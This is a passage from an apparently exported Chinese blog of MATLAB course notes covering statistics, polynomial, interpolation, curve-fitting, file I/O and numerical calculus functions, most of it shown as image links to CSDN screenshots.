<p>例子：<br><img src="https://img-blog.csdnimg.cn/20200227190011812.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227190312603.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>（3）中的[]不可省略<br><img src="https://img-blog.csdnimg.cn/2020022719141987.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200227191501205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227191515539.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227191641383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<h2 id="A-b-求平均值和中值"><a href="#A-b-求平均值和中值" class="headerlink" title="A.b 求平均值和中值"></a>A.b 求平均值和中值</h2><p><img src="https://img-blog.csdnimg.cn/20200227191748542.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mean()      % 求算术平均值</span><br><span class="line">median（）  % 求中值 </span><br></pre></td></tr></table></figure>
<h2 id="A-c-求和与求积"><a href="#A-c-求和与求积" class="headerlink" title="A.c 求和与求积"></a>A.c 求和与求积</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sum</span>()    % 求和</span><br><span class="line">prod（） % 求积</span><br></pre></td></tr></table></figure>

<h2 id="A-d-累加和与累乘积"><a href="#A-d-累加和与累乘积" class="headerlink" title="A.d 累加和与累乘积"></a>A.d 累加和与累乘积</h2><p><img src="https://img-blog.csdnimg.cn/20200227192228863.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="A-e-求标准差与相关系数"><a href="#A-e-求标准差与相关系数" class="headerlink" title="A.e 求标准差与相关系数"></a>A.e 求标准差与相关系数</h2><blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200227193437501.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227193539276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<blockquote>
<p><img src="https://img-blog.csdnimg.cn/2020022722014543.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227220247271.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<hr>
<h2 id="A-f-排序"><a href="#A-f-排序" class="headerlink" title="A.f 排序"></a>A.f 排序</h2><blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200227220407767.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">例子：<br><img src="https://img-blog.csdnimg.cn/20200227220633972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<h1 id="B-多项式计算"><a href="#B-多项式计算" class="headerlink" title="B 多项式计算"></a>B 多项式计算</h1><h2 id="B-a-多项式的表示"><a href="#B-a-多项式的表示" class="headerlink" title="B.a 多项式的表示"></a>B.a 多项式的表示</h2><blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200227221538611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<hr>
<h2 id="B-b-多项式的四则运算"><a href="#B-b-多项式的四则运算" class="headerlink" title="B.b 多项式的四则运算"></a>B.b 多项式的四则运算</h2><blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200227221630303.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227221730390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子：<img src="https://img-blog.csdnimg.cn/20200227221951225.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<hr>
<h2 id="B-c-多项式的求导-polyder"><a href="#B-c-多项式的求导-polyder" class="headerlink" title="B.c 多项式的求导(polyder)"></a>B.c 多项式的求导(polyder)</h2><blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200227222057467.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200227223129310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227223219563.png" alt="在这里插入图片描述"></p>
</blockquote>
<h2 id="B-d-多项式积分-polyder"><a href="#B-d-多项式积分-polyder" class="headerlink" title="B.d 多项式积分(polyder)"></a>B.d 多项式积分(polyder)</h2><p><code>q = polyint(p,k)</code> 使用积分常量 k 返回 p 中系数所表示的多项式积分。<br>示例：计算定积分<br><img src="https://img-blog.csdnimg.cn/20200527130724106.png" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20200527131352629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="B-e-多项式的求值-polyval-polyvalm"><a href="#B-e-多项式的求值-polyval-polyvalm" class="headerlink" title="B.e 多项式的求值(polyval;polyvalm)"></a>B.e 多项式的求值(polyval;polyvalm)</h2><p><img src="https://img-blog.csdnimg.cn/20200227223355703.png" alt="在这里插入图片描述"></p>
<blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200227223758193.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227224021103.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227224111336.png" alt="在这里插入图片描述"></p>
</blockquote>
<h2 id="B-f-多项式的求根-roots-poly"><a href="#B-f-多项式的求根-roots-poly" class="headerlink" title="B.f 多项式的求根(roots;poly)"></a>B.f 多项式的求根(roots;poly)</h2><blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200227224328846.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227224352731.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227224439105.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<h1 id="C-数据插值-interp"><a href="#C-数据插值-interp" class="headerlink" title="C 数据插值(interp)"></a>C 数据插值(interp)</h1><p><img src="https://img-blog.csdnimg.cn/20200227224913999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="C-a-引例-零件加工问题"><a href="#C-a-引例-零件加工问题" class="headerlink" title="C.a 引例-零件加工问题"></a>C.a 引例-零件加工问题</h2><blockquote>
<p><img src="https://img-blog.csdnimg.cn/2020022722541148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227225449602.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<h2 id="C-b-数据插值的计算机制"><a href="#C-b-数据插值的计算机制" class="headerlink" title="C.b 数据插值的计算机制"></a>C.b 数据插值的计算机制</h2><p><img src="https://img-blog.csdnimg.cn/20200227225630677.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227225837710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="C-c-数据插值的实现方法"><a href="#C-c-数据插值的实现方法" class="headerlink" title="C.c 数据插值的实现方法"></a>C.c 数据插值的实现方法</h2><blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200227230110162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227230200762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227230309132.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227230323972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>引例用四种方法插值：<br><img src="https://img-blog.csdnimg.cn/2020022723045227.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227230609996.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200227230738802.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227230828544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<h1 id="D-曲线拟合-plotfit"><a href="#D-曲线拟合-plotfit" class="headerlink" title="D 曲线拟合(plotfit)"></a>D 曲线拟合(plotfit)</h1><p>插值要求逼近函数在采样点的数值与原函数相等，然而在实验中，测量的数据不一定准确，如果强求逼近函数过样本点，显然是不合理的。使用曲线拟合可以避免这种情况。</p>
<h2 id="D-a-引例-人口预测问题"><a href="#D-a-引例-人口预测问题" class="headerlink" title="D.a 引例-人口预测问题"></a>D.a 引例-人口预测问题</h2><blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200227231750841.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020022723190549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<hr>
<h2 id="D-b-曲线拟合的原理"><a href="#D-b-曲线拟合的原理" class="headerlink" title="D.b 曲线拟合的原理"></a>D.b 曲线拟合的原理</h2><blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200227233203367.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227233315297.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<hr>
<h2 id="D-c-曲线拟合的实现方法"><a href="#D-c-曲线拟合的实现方法" class="headerlink" title="D.c 曲线拟合的实现方法"></a>D.c 曲线拟合的实现方法</h2><p><img src="https://img-blog.csdnimg.cn/20200227233521636.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<blockquote>
<p>图片来源：<br><a href="https://www.icourse163.org/search.htm?search=%E4%B8%AD%E5%8D%97%E5%A4%A7%E5%AD%A6%20Matlab#/">https://www.icourse163.org/search.htm?search=%E4%B8%AD%E5%8D%97%E5%A4%A7%E5%AD%A6%20Matlab#/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>matlab</category>
      </categories>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>(09)文件操作</title>
    <url>/2022/06/27/Matlab%E4%B8%AD%E5%8D%97%E5%A4%A7%E5%AD%A6%E7%AC%94%E8%AE%B0/%EF%BC%8809%EF%BC%89%E3%80%90Matlab%E3%80%91%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h1 id="A-在其他语言程序中读写MATLAB的数据文件"><a href="#A-在其他语言程序中读写MATLAB的数据文件" class="headerlink" title="A 在其他语言程序中读写MATLAB的数据文件"></a>A 在其他语言程序中读写MATLAB的数据文件</h1><h2 id="A-a-文件打开与关闭"><a href="#A-a-文件打开与关闭" class="headerlink" title="A.a 文件打开与关闭"></a>A.a 文件打开与关闭</h2><blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200228215354687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<span id="more"></span>

<p>打开文件不成功时，函数返回-1<br><img src="https://img-blog.csdnimg.cn/20200228215449675.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200228220415642.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<h2 id="A-b-文本文件的读写"><a href="#A-b-文本文件的读写" class="headerlink" title="A.b 文本文件的读写"></a>A.b 文本文件的读写</h2><blockquote>
<p><img src="https://img-blog.csdnimg.cn/2020022822065554.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020022822090497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200228221101481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<h2 id="A-c-二进制文件的读写"><a href="#A-c-二进制文件的读写" class="headerlink" title="A.c 二进制文件的读写"></a>A.c 二进制文件的读写</h2><blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200228221301861.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200228221401218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<h2 id="A-d-数据文件的定位"><a href="#A-d-数据文件的定位" class="headerlink" title="A.d 数据文件的定位"></a>A.d 数据文件的定位</h2><p><img src="https://img-blog.csdnimg.cn/20200228221650582.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200228221744520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200228221834763.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>-40<em>2</em>8:每组有两个数据，每个数据是double类型，占8个字节。</p>
<hr>
<blockquote>
<p>图片来源：<br><a href="https://www.icourse163.org/search.htm?search=%E4%B8%AD%E5%8D%97%E5%A4%A7%E5%AD%A6%20Matlab#/">https://www.icourse163.org/search.htm?search=%E4%B8%AD%E5%8D%97%E5%A4%A7%E5%AD%A6%20Matlab#/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>matlab</category>
      </categories>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>(06)数值微积分与方程求解</title>
    <url>/2022/06/27/Matlab%E4%B8%AD%E5%8D%97%E5%A4%A7%E5%AD%A6%E7%AC%94%E8%AE%B0/%EF%BC%8806%EF%BC%89%E3%80%90Matlab%E3%80%91%E6%95%B0%E5%80%BC%E5%BE%AE%E7%A7%AF%E5%88%86%E4%B8%8E%E6%96%B9%E7%A8%8B%E6%B1%82%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="A-数值微分与数值积分"><a href="#A-数值微分与数值积分" class="headerlink" title="A 数值微分与数值积分"></a>A 数值微分与数值积分</h1><h2 id="A-a数值微分-diff"><a href="#A-a数值微分-diff" class="headerlink" title="A.a数值微分(diff)"></a>A.a数值微分(diff)</h2><p><strong>&lt;1&gt;数值差分与差商</strong><br>任意函数$f(x)$在$x0$点的导数是通过极限定义的：<br><img src="https://img-blog.csdnimg.cn/20200417165628415.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200417165725935.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<span id="more"></span>

<p><img src="https://img-blog.csdnimg.cn/20200417165750394.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>&lt;2&gt;数值微分的实现</strong><br>MATLAB提供了求向前差分的函数diff，其调用格式有三种：</p>
<ul>
<li><code>dx=diff(x)</code>：计算向量x的一阶向前差分，<code>dx(i)=x(i+1)-x(i),i=1,2,...,n-1</code></li>
<li>dx&#x3D;diff(x, n) ：计算向量x的n阶向前差分。例如：<code>diff(x, 2)=diff(diff(x))</code></li>
<li>dx&#x3D;diff(A,n,dim)：计算矩阵A的n阶差分，dim&#x3D;1时（默认状态），按列计算差分；dim&#x3D;2时，按行计算差分。</li>
</ul>
<p>计算差分之后，可以计算$f（x）$在某点的差商，计算$f’(x)$的近似值。<br>例子：<br><img src="https://img-blog.csdnimg.cn/20200228000251618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="A-b-数值积分"><a href="#A-b-数值积分" class="headerlink" title="A.b 数值积分"></a>A.b 数值积分</h2><p><strong>&lt;1&gt;数值积分基本原理</strong><br>牛顿-莱布尼茨公式：<br><img src="https://img-blog.csdnimg.cn/20200417170440999.png" alt="在这里插入图片描述"><br>按积分区间[a, b]分成n个子区间$[x_i, x_{i+1}]，i&#x3D;1, 2,…,n$，其中$x_1&#x3D;a,x_{n+1}&#x3D;b$，这样求定积分的问题就分解为下面的求和问题：</p>
<p><img src="https://img-blog.csdnimg.cn/20200417170638298.png" alt="在这里插入图片描述"></p>
<p><strong>&lt;2&gt;数值积分的实现</strong></p>
<ul>
<li>基于自适应辛普森方法：<code>[l.n]=quad(filename, a, b, tol, trace)</code></li>
<li>基于自适应Gauss-Lobatto方法：<code>[l, n]=quadl(filename, a,b,tol, trace)</code></li>
</ul>
<p>其中，filename是被积函数名；a和b分别是定积分的上限和下限，积分限[a, b]必须是有限的，<strong>不能是无穷大</strong>；tol用来控制积分精度，默认时取$tol&#x3D;10^{-6}$；trace控制是否展现积分过程，若取非0则展现积分过程，取0则不展现，默认trace&#x3D;0；返回参数I即定积分的值。n为被积函数的调用次数。</p>
<p>例子：<br><img src="https://img-blog.csdnimg.cn/2020022800120816.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>基于全局自适应积分方法<br><code>I=integral(filename,a,b)</code><br>其中，I是计算得到的积分；filename是被积函数；a和b分别是定积分的下限和上限，<strong>积分限可以是无穷大</strong>。</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20200228001505240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>基于自适应高斯-克朗罗德方法<br><code>[I,err]=quadgk(filename, a, b)</code><br>其中，err返回近似误差范围，其他参数的含义和用法与quad函数想相同。积分上下限<strong>可以是无穷大，也可以是复数</strong>。如果积分上下限为复数，则quadgk函数在复平面上求积分。</li>
</ul>
<p>例子：<br><img src="https://img-blog.csdnimg.cn/20200228001619922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>基于梯形积分<br><img src="https://img-blog.csdnimg.cn/20200417172925334.png" alt="在这里插入图片描述"></li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20200417173027888.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
